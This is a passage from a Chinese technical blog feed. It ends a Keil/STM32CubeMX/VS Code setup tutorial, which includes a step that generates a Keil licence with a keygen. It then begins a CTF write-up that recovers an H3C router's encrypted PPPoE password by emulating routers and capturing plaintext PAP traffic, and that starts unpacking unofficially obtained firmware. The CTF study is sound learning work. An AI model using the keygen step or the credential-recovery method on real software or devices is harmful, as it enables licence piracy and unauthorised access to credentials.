alt="23"></p><p>将KeilC51的UV4目录中所有文件<code>Ctrl+A</code>全选后复制到KeilMDK的UV4目录中，对于同名文件选择跳过</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/24.png" alt="24"></p><p>将KeilC51中TOOLS.INI的内容全部复制到KeilMDK的TOOLS.INI末尾，将PATH修改为KeilMDK中C51文件夹的路径</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/25.png" alt="25"></p><p>打开Keil5MDK的License Management，复制CID到Keygen中，Target选择C51，生成LIC</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/26.png" alt="26"></p><p>以管理员身份打开KeilMDK，打开License Management，复制粘贴后ADD LIC</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/27.png" alt="27"></p><p>兼容C51成功</p><h3 id="STM32CubeMX"><a href="#STM32CubeMX" class="headerlink" title="STM32CubeMX"></a>STM32CubeMX</h3><p><a href="https://www.stmcu.com.cn/ecosystem/Cube/STM32cubemx">STM32CubeMX介绍</a></p><p><a href="https://www.yahboom.com/public/upload/upload-html/1701740148/HAL%E5%BA%93%E5%92%8CLL%E5%BA%93%E4%BB%8B%E7%BB%8D.html">HAL库和LL库介绍</a></p><p><a href="https://blog.csdn.net/ybhuangfugui/article/details/109759358">STM32四种库对比：寄存器、标准外设库、HAL、LL</a></p><p>STM32开发有四种可选的库，STM32CubeMX工具基于HAL和LL库，具体介绍参考上面的链接</p><ul><li>STM32Snippets(寄存器)</li><li>Standard Peripheral Library(SPL，标准外设库)</li><li>STM32Cube LL</li><li>STM32Cube HAL</li></ul><p>简单来说，STM32CubeMX是一个官方的用于帮助确定STM32 MCU&amp;MPU以及外设的信息并基于STM32Cube LL和HAL库进行初始化C代码、驱动程序、中间件、设备树等代码生成的图形化工具，可以大大缩短开发时间。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/28.png" alt="28"></p><p>安装需要jre环境，这里不多介绍。</p><p>配置完java环境后双击STM32CubeMX后更改安装目录，一路NEXT即可。</p><p>安装完成后点击<code>Manage embedded software packages</code>打开软件包管理界面</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/29.png" alt="29"></p><p>安装STM32F1x和STM32F4x的软件包</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/30.png" alt="30"></p><h3 id="VsCode辅助"><a href="#VsCode辅助" class="headerlink" title="VsCode辅助"></a>VsCode辅助</h3><p>Keil5的代码开发辅助功能不如Vscode强大，所以我们可以利用Vscode插件把代码编辑的场景从Keil迁移到Vscode，编译和调试依旧使用Keil5。</p><p>先安装windows上的c语言编译器，把mingw64文件夹中bin目录的路径添加到系统环境变量，在cmd中输入gcc -v，显示mingw64版本说明安装成功</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/31.png" alt="31"></p><p>VsCode中安装以下插件</p><ul><li><p>c&#x2F;c++</p></li><li><p>C&#x2F;C++ Extension Pack</p></li><li><p>Keil Assistant</p></li></ul><p>进入Keil Assistant的设置界面，填入Keil5MDK中的UV4.exe路径，如果完成了兼容C51的操作，可以把C51的也填了</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/32.png" alt="32"></p><p>安装完成后会出现<code>KEIL UVISION PROJECT</code>选项，选中后点击右侧的图标，选择keil工程文件打开</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/33.png" alt="33"></p><p>识别成功，左下角可以编译和烧录程序，但是使用的编译器和仿真器等具体的参数需要在Keil MDK中设置，所以只建议使用VsCode作为代码编辑器，编译和烧录依然通过Keil。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/34.png" alt="34"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/zy2232652/article/details/142255983">STM32F407VET6单片机详解</a></p><p><a href="https://www.cnblogs.com/Sharemaker/p/17616460.html">一文搞明白STM32芯片存储结构</a></p><p><a href="https://blog.csdn.net/m0_56694518/article/details/131186806">STM32&amp;ARM体系结构（嵌入式学习）</a></p><p><a href="https://en.wikipedia.org/wiki/List_of_ARM_processors">List of ARM processors</a></p><p><a href="https://blog.csdn.net/weixin_63096487/article/details/132511384">JTAG、SWD、DAP、STLink、JLink、ULink这些东西的关系</a></p><p><a href="https://zhuanlan.zhihu.com/p/454940732">你了解JLink、ST-Link、ULink、JTAG、SWD、SWIM的区别吗</a></p><p><a href="https://blog.csdn.net/xieliru/article/details/139876236">STM32三种调试工具CMSIS-DAP、J-Link和ST-Link</a></p><p><a href="https://zhuanlan.zhihu.com/p/367821312">单片机程序烧录的3种方式(ISP、ICP、IAP)是什么？ - 知乎</a></p><p><a href="https://www.bilibili.com/read/cv39423504/?jump_opus=1">Keil5安装+STM32CubeMX安装+VSCode辅助开发教程</a></p><p><a href="https://blog.csdn.net/weiqifa0/article/details/123436815">Keil的发展历史</a></p><p>[[ST官网]STM32F407&#x2F;417: 相关PDF文档](STM32F407&#x2F;417: 相关PDF文档)</p><p><a href="https://blog.csdn.net/qq_42417071/article/details/137442226">Keil MDK 与 Keil C51 共存的方法</a></p><p><a href="https://blog.csdn.net/Landlord_BZ/article/details/107298033">STM32之CubeMX学习笔记（1）什么是CubeMX 什么是HAL库</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>STM32</tag>
      
      <tag>开发</tag>
      
      <tag>嵌入式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三道CTF题目学习h3c路由器&amp;stm32裸机&amp;Infineon车机固件逆向</title>
    <link href="/2024/11/06/%E4%BB%8E2024L3hCTF&amp;&amp;SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&amp;stm32%E8%A3%B8%E6%9C%BA&amp;Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/"/>
    <url>/2024/11/06/%E4%BB%8E2024L3hCTF&amp;&amp;SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&amp;stm32%E8%A3%B8%E6%9C%BA&amp;Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="三道CTF题目学习h3c路由器-amp-stm32裸机-amp-Infineon车机固件逆向"><a href="#三道CTF题目学习h3c路由器-amp-stm32裸机-amp-Infineon车机固件逆向" class="headerlink" title="三道CTF题目学习h3c路由器&amp;stm32裸机&amp;Infineon车机固件逆向"></a>三道CTF题目学习h3c路由器&amp;stm32裸机&amp;Infineon车机固件逆向</h1><h2 id="2024L3hCTF-hhhc"><a href="#2024L3hCTF-hhhc" class="headerlink" title="2024L3hCTF hhhc"></a>2024L3hCTF hhhc</h2><p>考点：h3c路由器固件逆向</p><p>题目描述</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-comment">Remember the &quot;hillst0ne&quot; challenge in L3HCTF2021?L3HSec also has an MSR3610 router deployed since 2021. Now we have decided to upgrade to a newer model, but we couldn&#x27;t find the PPPoE password. Could you locate it in the existing configuration?</span><br></code></pre></td></tr></table></figure><p>出题人把h3c路由器的pppoe密码忘了，将其通过路由器配置信息恢复密码的经历出成了题目，还挺有趣的。</p><p>没有给固件，只给了<code>startup.cfg</code>文件，里面有路由器的配置信息，如下。要求还原PPPoE协议身份验证中admin用户的密码。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[L3HSEC-ROUTER-1]show current-configuration<br><span class="hljs-comment">#</span><br> version 7.1.064, Release 0821P16 <br><span class="hljs-comment">#</span><br> sysname L3HSEC-ROUTER-1<br><span class="hljs-comment">#</span><br>wlan global-configuration<br><span class="hljs-comment">#</span><br> security-zone intra-zone<span class="hljs-built_in"> default </span>permit<br><span class="hljs-comment">#</span><br> dhcp <span class="hljs-built_in">enable</span><br> dhcp<span class="hljs-built_in"> server </span>always-broadcast<br><span class="hljs-comment">#</span><br><span class="hljs-built_in"> dns proxy </span><span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> system-working-mode standard<br> password-recovery <span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">vlan </span>1<br><span class="hljs-comment">#</span><br>dhcp<span class="hljs-built_in"> server </span>ip-pool lan1<br> gateway-list 192.168.0.1<br><span class="hljs-built_in"> network </span>192.168.0.0 mask 255.255.254.0<br><span class="hljs-built_in"> address </span>range 192.168.1.2 192.168.1.254<br> dns-list 192.168.0.1<br><span class="hljs-comment">#</span><br>controller Cellular0/0<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>Dialer0<br><span class="hljs-built_in"> ppp </span>chap password cipher <span class="hljs-variable">$c</span><span class="hljs-variable">$3</span><span class="hljs-variable">$TKYJXT4RmMIvPHQX</span>+5Ehf9oD3kjskIur3PGJfR/<span class="hljs-attribute">7fEyqfbx0K0DAokR0pd3rsRbWR5t9Cr3xSbYoPdogCg</span>==<br><span class="hljs-built_in"> ppp </span>chap<span class="hljs-built_in"> user </span>hustpppoe114514<br><span class="hljs-built_in"> ppp </span>pap local-user hustpppoe114514 password cipher <span class="hljs-variable">$c</span><span class="hljs-variable">$3</span><span class="hljs-variable">$3PbDU2m2</span>/6Neiiz9iO+i641UKjafFMvrfphBc3fmrZ+9Q2TZu3g5l2Hlg1gJWO6ZQLJ4S+<span class="hljs-attribute">r85qU8EQpqQQ</span>==<br>dialer bundle <span class="hljs-built_in">enable</span><br> dialer-group 2<br> dialer timer idle 0<br> dialer timer autodial 5<br><span class="hljs-built_in"> ip address </span>ppp-negotiate<br><span class="hljs-built_in"> nat </span>outbound<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>NULL0<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/0<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span> description LAN-interface<br><span class="hljs-built_in"> ip address </span>192.168.0.1 255.255.254.0<br> tcp mss 1280<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/1<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/1.3647<br> vlan-type dot1q vid 3647<br><span class="hljs-built_in"> pppoe-client </span>dial-bundle-number 0<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/2<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span> combo <span class="hljs-built_in">enable</span> copper<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/3<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span> combo <span class="hljs-built_in">enable</span> copper<br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/4<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">interface </span>GigabitEthernet0/5<br><span class="hljs-built_in"> port </span>link-mode<span class="hljs-built_in"> route</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><br><span class="hljs-built_in"> scheduler </span>logfile size 16<br><span class="hljs-comment">#</span><br>line class<span class="hljs-built_in"> console</span><br><span class="hljs-built_in"></span> user-role network-admin<br><span class="hljs-comment">#</span><br>line class tty<br> user-role network-operator<br><span class="hljs-comment">#</span><br>line class vty<br> user-role network-operator<br><span class="hljs-comment">#</span><br>line con 0<br> user-role network-admin<br><span class="hljs-comment">#</span><br>line vty 0 63<br> authentication-mode scheme<br> user-role network-operator<br><span class="hljs-comment">#</span><br>performance-management<br><span class="hljs-comment">#</span><br> password-control <span class="hljs-built_in">enable</span><br> undo password-control aging <span class="hljs-built_in">enable</span><br> undo password-control history <span class="hljs-built_in">enable</span><br> password-control length 6<br> password-control login-attempt 3 exceed lock-time 10<br> password-control update-interval 0<br> password-control login idle-time 0<br><span class="hljs-comment">#</span><br>domain<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><br> domain<span class="hljs-built_in"> default </span><span class="hljs-built_in">enable</span><span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><br>role name level-0<br> description Predefined level-0 role<br><span class="hljs-comment">#</span><br>role name level-1<br> description Predefined level-1 role<br><span class="hljs-comment">#</span><br>role name level-2<br> description Predefined level-2 role<br><span class="hljs-comment">#</span><br>role name level-3<br> description Predefined level-3 role<br><span class="hljs-comment">#</span><br>role name level-4<br> description Predefined level-4 role<br><span class="hljs-comment">#</span><br>role name level-5<br> description Predefined level-5 role<br><span class="hljs-comment">#</span><br>role name level-6<br> description Predefined level-6 role<br><span class="hljs-comment">#</span><br>role name level-7<br> description Predefined level-7 role<br><span class="hljs-comment">#</span><br>role name level-8<br> description Predefined level-8 role<br><span class="hljs-comment">#</span><br>role name level-9<br> description Predefined level-9 role<br><span class="hljs-comment">#</span><br>role name level-10<br> description Predefined level-10 role<br><span class="hljs-comment">#</span><br>role name level-11<br> description Predefined level-11 role<br><span class="hljs-comment">#</span><br>role name level-12<br> description Predefined level-12 role<br><span class="hljs-comment">#</span><br>role name level-13<br> description Predefined level-13 role<br><span class="hljs-comment">#</span><br>role name level-14<br> description Predefined level-14 role<br><span class="hljs-comment">#</span><br>user-group<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#</span><br>local-user admin class manage<br> service-type telnet http<br> authorization-attribute user-role network-admin<br><span class="hljs-comment">#</span><br><span class="hljs-built_in"> ip </span>http <span class="hljs-built_in">enable</span><br> web new-style<br><span class="hljs-comment">#</span><br>wlan ap-group default-group<br><span class="hljs-built_in"> vlan </span>1<br><span class="hljs-comment">#</span><br>return<br>[L3HSEC-ROUTER-1]<br></code></pre></td></tr></table></figure><p>关键信息</p><ul><li>设备型号</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">MSR3610<br></code></pre></td></tr></table></figure><ul><li>固件版本</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span> <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">064</span>, Release <span class="hljs-number">0821</span>P16<br></code></pre></td></tr></table></figure><ul><li>PPPoE密码的密文，这里chap和pap对应同一个密码</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ppp chap password cipher <span class="hljs-variable">$c</span><span class="hljs-variable">$3</span><span class="hljs-variable">$TKYJXT4RmMIvPHQX</span>+5Ehf9oD3kjskIur3PGJfR/<span class="hljs-attribute">7fEyqfbx0K0DAokR0pd3rsRbWR5t9Cr3xSbYoPdogCg</span>==<span class="hljs-built_in"></span><br><span class="hljs-built_in">ppp </span>chap<span class="hljs-built_in"> user </span>hustpppoe114514<span class="hljs-built_in"></span><br><span class="hljs-built_in">ppp </span>pap local-user hustpppoe114514 password cipher <span class="hljs-variable">$c</span><span class="hljs-variable">$3</span><span class="hljs-variable">$3PbDU2m2</span>/6Neiiz9iO+i641UKjafFMvrfphBc3fmrZ+9Q2TZu3g5l2Hlg1gJWO6ZQLJ4S+<span class="hljs-attribute">r85qU8EQpqQQ</span>==<br></code></pre></td></tr></table></figure><p>两种解题思路</p><ul><li><p>由于PPPoE协议的密码明文传输，可以仿真运行任意h3c路由器后导入配置，抓包查看密码</p></li><li><p>获取该版本固件对加密进行逆向分析</p></li></ul><h3 id="思路1-仿真抓包"><a href="#思路1-仿真抓包" class="headerlink" title="思路1 - 仿真抓包"></a>思路1 - 仿真抓包</h3><p>参考<a href="https://cloud.tencent.com/developer/article/1898168">PPP 会话验证：PAP和CHAP有啥区别？两张神图总结完！</a>可知PPPoE采用CS架构，有PAP和CHAP两种身份验证方式，CHAP的用户名密码传输时使用md5加密，PAP的用户名密码在从client向server传输时是<strong>明文</strong>，因此可以仿真 -&gt; 导入PAP配置 -&gt; 抓包 -&gt; 获取密码。</p><p><a href="https://www.h3c.com/cn/Service/Document_Software/Software_Download/Other_Product/H3C_Cloud_Lab/Catalog/HCL/">下载H3C网络设备模拟器-HCL</a>   笔者的计网实验课程是H3C的讲师上的，所以课内用过这个工具</p><p>放两个MSR3620路由器，开启并连接GE0&#x2F;0</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/1.png" alt="1"></p><p><a href="https://blog.csdn.net/m0_74341869/article/details/128879230">PPPoE客户端和服务端配置参考</a>   <a href="https://www.h3c.com/cn/d_202406/2197414_30005_0.htm">H3C PPPoE配置手册</a></p><p>这里不需要进行IP相关配置，将PPPoE服务绑定在GE0&#x2F;0物理接口直连即可。同时只采用PAP身份验证，所以CHAP的信息不用配置。</p><p>配置client，每5秒自动拨号一次</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">system-view<br>interface Dialer0  #配置一个拨号接口，通常用于 PPPoE 连接<br>ppp pap local-user hustpppoe114514 password cipher $c$3$3PbDU2m2/6Neiiz9iO+i641UKjafFMvrfphBc3fmrZ+9Q2TZu3g5l2Hlg1gJWO6ZQLJ4S+r85qU8EQpqQQ== #指定拨号的认证方式为PPP并设置用户名和密码<br>dialer bundle enable #开启共享DDR（Dial-on-Demand Routing，按需拨号路由）<br>dialer-group 2 #应用特定的拨号组（组号为2）进行流量过滤或控制，通常与特定的 ACL（访问控制列表）配合使用。<br>dialer timer idle 0 #将空闲断线计时器设置为 0，意味着接口不会因为没有流量而自动断开<br>dialer timer autodial 5  #如果连接断开或没有建立连接，每隔 5 秒自动尝试重新拨号<br>ip address ppp-negotiate #配置接口从 PPPoE 服务器动态协商获得 IP 地址<br>nat outbound #启用出站流量的 NAT 功能，使内部网络可以通过该接口访问公网<br>exit<br>interface GigabitEthernet0/0 #进入物理接口GigabitEthernet0/0的配置<br>port link-mode route #将端口模式设置为路由模式，表示该接口将进行数据包转发，而不是数据交换（常用于 WAN 接口）<br>pppoe-client dial-bundle-number 0  #将物理接口与拨号接口（dial bundle 0）关联，以启动 PPPoE 连接<br>exit<br></code></pre></td></tr></table></figure><p>配置server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">system-view<br>interface virtual-template 1 #配置虚拟模板接口 1，用于 PPPoE 服务器端的接口模板<br>ppp authentication-mode pap domain dm1 #设置 PPP 的认证模式为 PAP，并指定认证域为 dm1<br>quit<br>interface gigabitethernet 0/0 #进入GE0/0物理接口配置<br>pppoe-server bind virtual-template 1 #将物理接口绑定到虚拟模板接口 1，使 GigabitEthernet 0/0 能够作为 PPPoE 服务器的服务接口<br>quit<br>local-user hustpppoe114514 class network     #配置一个本地用户，用户名为 hustpppoe114514，并将用户类型设为 network <br>password cipher $c$3$3PbDU2m2/6Neiiz9iO+i641UKjafFMvrfphBc3fmrZ+9Q2TZu3g5l2Hlg1gJWO6ZQLJ4S+r85qU8EQpqQQ== #配置用户的密码<br>service-type ppp #将用户的服务类型设置为ppp     <br>quit<br></code></pre></td></tr></table></figure><p>右键连线开启抓包，开启wireshark得到密码</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/2.png" alt="2"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">L3HCTF&#123;pPp0e_mus7_s@v3_pla1ntex7_pswdDddD&#125;<br></code></pre></td></tr></table></figure><h3 id="思路2-逆向固件"><a href="#思路2-逆向固件" class="headerlink" title="思路2 - 逆向固件"></a>思路2 - 逆向固件</h3><h4 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h4><p>华为&#x2F;h3c的固件需要授权账号才能下载，所以只能通过其它渠道获取固件。</p><p>该版本固件似乎应用于一系列路由器，我们只要找到其中一种即可</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/3.png" alt="3"></p><p>找到MER8300的该版本固件</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/4.png" alt="4"></p><p>下载后解压得到固件<code>MER8300-CMW710-R0821P16.ipe</code></p><h4 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h4><p>ipe是H3C自研的固件打包格式，如果不按照打包格式进行解包，直接binwalk只能获取一堆零散的文件</p><p>如果有H3C设备，可以参考该<a href="https://zhiliao.h3c.com/questions/dispcont/85586">文章</a>通过install命令解包ipe固件</p><p>github上有ipe固件解包脚本 - <a href="https://github.com/zzxzhuo/H3C-IPE-Unarchiver">H3C-IPE-Unarchiver</a>，但是只能提取出固件的各个分区文件，还要继续分析分区文件</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/5.png" alt="5"></p><p>除了system分区，其余分区内容都很少，包括PPPoE相关程序在内的大部分内容位于system分区文件中</p><p>通过不断的对比分析，发现对于各个分区文件，有如下的通用格式</p><p>其中有一些未知的数据，但是最关键的文件名、文件大小和文件本身都有了</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">0x188c 分区整体头部</span><br><span 